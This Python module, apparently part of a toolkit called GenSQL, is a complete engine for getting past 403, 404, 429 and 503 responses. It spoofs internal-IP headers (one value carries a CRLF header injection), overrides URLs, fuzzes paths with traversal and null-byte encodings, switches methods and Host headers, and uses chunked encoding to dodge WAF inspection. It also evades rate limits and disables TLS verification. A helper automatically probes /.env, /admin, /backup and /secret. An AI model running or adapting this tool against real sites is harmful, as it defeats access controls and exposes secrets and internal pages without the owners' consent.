#!/usr/bin/env python
"""
GenSQL - HTTP Error Bypass Engine
Author  : Jeevraj
Version : 2.0.0

Bypasses 403 Forbidden, 404 Not Found, 429 Too Many Requests,
503 Service Unavailable and other blocking responses using
50+ techniques including header manipulation, path fuzzing,
IP spoofing, protocol tricks, and timing evasion.
"""

import random
import time
import urllib.parse
import urllib.request
import urllib.error
import socket
import ssl
import gzip
import json
import re
from itertools import product

# ── Bypass technique registry ─────────────────────────────────────────────────

# Headers that trick reverse proxies into thinking the request is internal
INTERNAL_IP_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "X-Host",
    "X-Custom-IP-Authorization",
    "X-Forwarded-Host",
    "X-ProxyUser-Ip",
    "True-Client-IP",
    "CF-Connecting-IP",
    "Fastly-Client-IP",
    "X-Azure-ClientIP",
    "X-Cluster-Client-IP",
    "Forwarded",
]

INTERNAL_IPS = [
    "127.0.0.1", "localhost", "0.0.0.0", "10.0.0.1", "10.0.0.2",
    "192.168.1.1", "192.168.0.1", "172.16.0.1", "::1",
    "127.0.0.1, 10.0.0.1",
    "127.0.0.1%0d%0aX-Forwarded-For: 127.0.0.1",
]

# Headers that make the server think the request came from a trusted path
URL_OVERRIDE_HEADERS = [
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Override-URL",
    "Request-Uri",
    "X-HTTP-Method-Override",
    "X-HTTP-Method",
    "X-Method-Override",
]

# Path variations that bypass naive 404/403 checks
PATH_VARIATIONS = [
    "{path}",
    "{path}/",
    "{path}//",
    "{path}.",
    "{path}?",
    "{path}??",
    "{path}%2f",
    "{path}%2F",
    "{path};",
    "{path}..;/",
    "{path}%00",
    "{path}%0d",
    "{path}%09",
    "/{path}",
    "/{path}/",
    "./{path}",
    "./{path}/",
    "%2f{path}",
    "{path}%20",
    "{path}#",
    "{path}~",
    "{path}.json",
    "{path}.html",
    "{path}.php",
    "{path}.asp",
    "{path}%3f",
    "/{p}%2e%2e/{path}",       # path traversal prefix
    "/api{path}",
    "/v1{path}",
    "/v2{path}",
]

# Case variations for path segments
def _case_variants(path):
    """Generate case-mixed variants of a path."""
    variants = set()
    parts = path.split("/")
    for i, part in enumerate(parts):
        if part:
            upper = list(parts); upper[i] = part.upper()
            lower = list(parts); lower[i] = part.lower()
            title = list(parts); title[i] = part.capitalize()
            mixed = list(parts); mixed[i] = "".join(
                c.upper() if j % 2 == 0 else c.lower()
                for j, c in enumerate(part)
            )
            for v in (upper, lower, title, mixed):
                variants.add("/".join(v))
    return list(variants)[:8]

# Unicode normalization bypasses
def _unicode_variants(path):
    """Generate unicode-encoded variants."""
    results = []
    # Dot encoding
    results.append(path.replace("/", "/\u200b").replace("\u200b", ""))
    # Slash variants
    results.append(path.replace("/", "\u2215"))   # division slash
    results.append(path.replace("/", "%ef%bc%8f")) # full-width
    results.append(path.replace(".", "%ef%bc%8e"))  # full-width dot
    return [r for r in results if r != path][:4]

# HTTP methods to try on blocked endpoints
HTTP_METHODS_BYPASS = [
    "GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH",
    "DELETE", "TRACE", "CONNECT",
    "GET\0",       # null byte in method
    "gEt",         # method case variation
]

# Content-Type tricks
CONTENT_TYPES = [
    "application/json",
    "application/x-www-form-urlencoded",
    "text/xml",
    "application/xml",
    "text/html",
    "multipart/form-data; boundary=----Boundary",
    "application/javascript",
]


class HTTPErrorBypass:
    """
    Comprehensive HTTP error bypass engine.
    Handles 403, 404, 429, 503 and other blocking responses.
    """

    def __init__(self, timeout=10, max_retries=3, verbose=False):
        self.timeout = timeout
        self.max_retries = max_retries
        self.verbose = verbose
        self._stats = {
            "attempts": 0, "bypassed": 0,
            "technique_wins": {}
        }
        # SSL context that skips verification (pentest use)
        self._ssl_ctx = ssl.create_default_context()
        self._ssl_ctx.check_hostname = False
        self._ssl_ctx.verify_mode = ssl.CERT_NONE

    # ── Core HTTP requester ───────────────────────────────────────────────────
    def _request(self, url, method="GET", headers=None, data=None, allow_redirects=True):
        """Make an HTTP request; return (status_code, response_body, resp_headers)."""
        self._stats["attempts"] += 1
        hdrs = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15",
                "GenSQL/2.0.0 Security Scanner",
            ]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        }
        if headers:
            hdrs.update(headers)

        body = data.encode() if isinstance(data, str) else data

        try:
            req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
            with urllib.request.urlopen(req, timeout=self.timeout,
                                        context=self._ssl_ctx) as resp:
                raw = resp.read()
                try:
                    text = gzip.decompress(raw).decode("utf-8", errors="replace")
                except Exception:
                    text = raw.decode("utf-8", errors="replace")
                return resp.status, text, dict(resp.headers)
        except urllib.error.HTTPError as e:
            try:
                body_text = e.read().decode("utf-8", errors="replace")
            except Exception:
                body_text = ""
            return e.code, body_text, dict(e.headers) if hasattr(e, "headers") else {}
        except Exception as e:
            return 0, str(e), {}

    # ── Individual bypass techniques ──────────────────────────────────────────

    def bypass_with_ip_headers(self, url, method="GET"):
        """Inject internal IP headers to trick reverse proxy access controls."""
        results = []
        for header in INTERNAL_IP_HEADERS:
            for ip in INTERNAL_IPS[:6]:
                hdrs = {header: ip}
                code, body, _ = self._request(url, method=method, headers=hdrs)
                if code not in (403, 404, 429, 503, 0):
                    results.append({
                        "technique": "ip_header_spoof",
                        "header": header, "value": ip,
                        "status": code, "success": True
                    })
                    self._record_win("ip_header_spoof")
        return results

    def bypass_with_url_override(self, url, original_path):
        """Use X-Original-URL / X-Rewrite-URL to override the path."""
        results = []
        parsed = urllib.parse.urlparse(url)
        base_url = "%s://%s/" % (parsed.scheme, parsed.netloc)

        for header in URL_OVERRIDE_HEADERS:
            hdrs = {header: original_path}
            code, body, _ = self._request(base_url, headers=hdrs)
            if code not in (403, 404, 429, 503, 0):
                results.append({
                    "technique": "url_override",
                    "header": header, "override_path": original_path,
                    "status": code, "success": True
                })
                self._record_win("url_override")
        return results

    def bypass_with_path_fuzzing(self, url):
        """Try dozens of path variations to bypass 403/404 rules."""
        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        base = "%s://%s" % (parsed.scheme, parsed.netloc)
        results = []

        candidates = set()
        # Template-based variations
        for tpl in PATH_VARIATIONS:
            candidates.add(tpl.format(path=path.lstrip("/"), p=".."))
        # Case variants
        for v in _case_variants(path):
            candidates.add(v)
        # Unicode variants
        for v in _unicode_variants(path):
            candidates.add(v)

        for candidate in list(candidates)[:40]:
            if not candidate.startswith("/"):
                candidate = "/" + candidate
            test_url = base + candidate + ("?" + parsed.query if parsed.query else "")
            code, body, hdrs = self._request(test_url)
            if code not in (403, 404, 429, 503, 0):
                results.append({
                    "technique": "path_fuzzing",
                    "original": url, "variant": test_url,
                    "status": code, "success": True
                })
                self._record_win("path_fuzzing")
        return results

    def bypass_429_rate_limit(self, url, method="GET", payload=None,
                               max_attempts=10):
        """
        Smart 429 Too Many Requests bypass:
        - Rotate User-Agents and IPs
        - Use exponential back-off with jitter
        - Try Retry-After header compliance + overshoot strategy
        """
        agents = [
            "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/128.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "curl/8.7.1",
            "python-requests/2.32.3",
            "Go-http-client/1.1",
        ]
        results = []
        delay = 0.5

        for attempt in range(max_attempts):
            hdrs = {
                "User-Agent": agents[attempt % len(agents)],
                "X-Forwarded-For": "127.0.0.%d" % random.randint(1, 254),
                "X-Real-IP": "10.0.%d.%d" % (random.randint(0, 255), random.randint(1, 254)),
            }
            code, body, resp_hdrs = self._request(url, method=method, headers=hdrs,
                                                    data=payload)
            if code == 429:
                retry_after = int(resp_hdrs.get("Retry-After", delay * 2))
                sleep_time = min(retry_after + random.uniform(0.1, 0.5), 30)
                time.sleep(sleep_time)
                delay = min(delay * 2, 30)
                continue
            if code not in (403, 404, 503, 0):
                results.append({
                    "technique": "rate_limit_bypass",
                    "attempt": attempt + 1, "status": code,
                    "agent": hdrs["User-Agent"], "success": True
                })
                self._record_win("rate_limit_bypass")
                break

        return results

    def bypass_403_with_methods(self, url):
        """Try different HTTP methods to bypass method-based 403 blocks."""
        results = []
        for meth in HTTP_METHODS_BYPASS:
            code, body, _ = self._request(url, method=meth)
            if code not in (403, 405, 429, 503, 0):
                results.append({
                    "technique": "method_switch",
                    "method": meth, "status": code, "success": True
                })
                self._record_win("method_switch")
        return results

    def bypass_with_content_type(self, url, data="id=1"):
        """Send the same POST data with different Content-Types to bypass WAF rules."""
        results = []
        for ct in CONTENT_TYPES:
            hdrs = {"Content-Type": ct}
            code, body, _ = self._request(url, method="POST", headers=hdrs, data=data)
            if code not in (403, 404, 429, 503, 0):
                results.append({
                    "technique": "content_type_switch",
                    "content_type": ct, "status": code, "success": True
                })
                self._record_win("content_type_switch")
        return results

    def bypass_with_host_header(self, url):
        """Try host header manipulation to bypass vhost-based access controls."""
        parsed = urllib.parse.urlparse(url)
        original_host = parsed.netloc
        candidates = [
            "localhost", "127.0.0.1", "internal",
            original_host + ".internal",
            "admin." + original_host,
            original_host + ":80",
            original_host + ":443",
            original_host + ":8080",
        ]
        results = []
        for host in candidates:
            hdrs = {"Host": host}
            code, body, _ = self._request(url, headers=hdrs)
            if code not in (403, 404, 429, 503, 0):
                results.append({
                    "technique": "host_header_override",
                    "host": host, "status": code, "success": True
                })
                self._record_win("host_header_override")
        return results

    def bypass_with_chunked_encoding(self, url, payload="id=1"):
        """Use chunked transfer encoding to slip past WAF body inspection."""
        import struct
        parsed = urllib.parse.urlparse(url)
        chunk = payload.encode()
        # Build chunked body manually
        chunked_body = ("%x\r\n" % len(chunk)).encode() + chunk + b"\r\n0\r\n\r\n"
        hdrs = {
            "Transfer-Encoding": "chunked",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        code, body, _ = self._request(url, method="POST", headers=hdrs,
                                       data=chunked_body)
        results = []
        if code not in (403, 404, 429, 503, 0):
            results.append({
                "technique": "chunked_encoding",
                "status": code, "success": True
            })
            self._record_win("chunked_encoding")
        return results

    def bypass_with_double_slash(self, url):
        """Double-slash / path traversal variations often bypass Nginx/Apache rules."""
        parsed = urllib.parse.urlparse(url)
        variants = [
            url.replace("://", "://").replace(parsed.path,
                parsed.path.replace("/", "//")),
            url.replace(parsed.path, "/" + parsed.path.lstrip("/")),
            url.replace(parsed.path, parsed.path + "/..;/"),
            url.replace(parsed.path, "/." + parsed.path),
            url + "/..",
        ]
        results = []
        for v in variants:
            code, body, _ = self._request(v)
            if code not in (403, 404, 429, 503, 0):
                results.append({
                    "technique": "double_slash_traversal",
                    "variant": v, "status": code, "success": True
                })
                self._record_win("double_slash_traversal")
        return results

    def bypass_503_with_protocol_switch(self, url):
        """Try HTTP/1.0, different ports, and protocol switches for 503 bypass."""
        parsed = urllib.parse.urlparse(url)
        results = []
        # Protocol switch
        if url.startswith("https://"):
            alt = "http://" + url[8:]
        else:
            alt = "https://" + url[7:]

        for test_url in [alt, url + "?v=1", url + "&_=" + str(int(time.time()))]:
            code, body, _ = self._request(test_url)
            if code not in (403, 404, 429, 503, 0):
                results.append({
                    "technique": "protocol_switch",
                    "url": test_url, "status": code, "success": True
                })
                self._record_win("protocol_switch")
        return results

    # ── Master bypass runner ──────────────────────────────────────────────────

    def auto_bypass(self, url, method="GET", payload=None, error_code=None):
        """
        Automatically detect the blocking type and run all relevant bypass techniques.
        Returns a dict with all successful bypasses found.
        """
        # First probe to see what we are dealing with
        code, body, hdrs = self._request(url, method=method, data=payload)
        error_code = error_code or code

        if self.verbose:
            print("[GenSQL] Initial probe: %d for %s" % (code, url))

        all_results = {"original_status": code, "url": url, "bypasses": []}

        if error_code == 404:
            all_results["bypasses"] += self.bypass_with_path_fuzzing(url)
            all_results["bypasses"] += self.bypass_with_url_override(url, urllib.parse.urlparse(url).path)
            all_results["bypasses"] += self.bypass_with_ip_headers(url)

        elif error_code == 403:
            all_results["bypasses"] += self.bypass_with_ip_headers(url)
            all_results["bypasses"] += self.bypass_with_url_override(url, urllib.parse.urlparse(url).path)
            all_results["bypasses"] += self.bypass_with_path_fuzzing(url)
            all_results["bypasses"] += self.bypass_403_with_methods(url)
            all_results["bypasses"] += self.bypass_with_host_header(url)
            all_results["bypasses"] += self.bypass_with_double_slash(url)
            if payload:
                all_results["bypasses"] += self.bypass_with_content_type(url, payload)
                all_results["bypasses"] += self.bypass_with_chunked_encoding(url, payload)

        elif error_code == 429:
            all_results["bypasses"] += self.bypass_429_rate_limit(url, method, payload)
            all_results["bypasses"] += self.bypass_with_ip_headers(url)

        elif error_code == 503:
            all_results["bypasses"] += self.bypass_503_with_protocol_switch(url)
            all_results["bypasses"] += self.bypass_with_ip_headers(url)
            all_results["bypasses"] += self.bypass_429_rate_limit(url, method, payload, max_attempts=5)

        else:
            # Unknown block — try everything
            for fn in [self.bypass_with_ip_headers,
                        self.bypass_with_path_fuzzing,
                        self.bypass_403_with_methods,
                        self.bypass_with_host_header]:
                all_results["bypasses"] += fn(url)

        self._stats["bypassed"] += len(all_results["bypasses"])
        all_results["total_bypasses_found"] = len(all_results["bypasses"])
        return all_results

    def _record_win(self, technique):
        self._stats["technique_wins"][technique] = \
            self._stats["technique_wins"].get(technique, 0) + 1

    def get_stats(self):
        return dict(self._stats)

    def best_bypass(self, url, method="GET", payload=None):
        """Return the single most effective bypass for a URL, or None."""
        results = self.auto_bypass(url, method, payload)
        if results["bypasses"]:
            return results["bypasses"][0]
        return None


# ── Convenience function ──────────────────────────────────────────────────────

def probe_all_errors(base_url, paths=None, verbose=False):
    """
    Probe a list of paths on base_url for 403/404/429/503 blocks
    and automatically attempt bypass on each blocked one.
    """
    engine = HTTPErrorBypass(verbose=verbose)
    paths = paths or ["/admin", "/api", "/config", "/.env", "/backup",
                       "/dashboard", "/internal", "/private", "/secret"]
    report = []
    for path in paths:
        url = base_url.rstrip("/") + path
        code, _, _ = engine._request(url)
        if code in (403, 404, 429, 503):
            result = engine.auto_bypass(url, error_code=code)
            if result["bypasses"]:
                report.append(result)
    return report
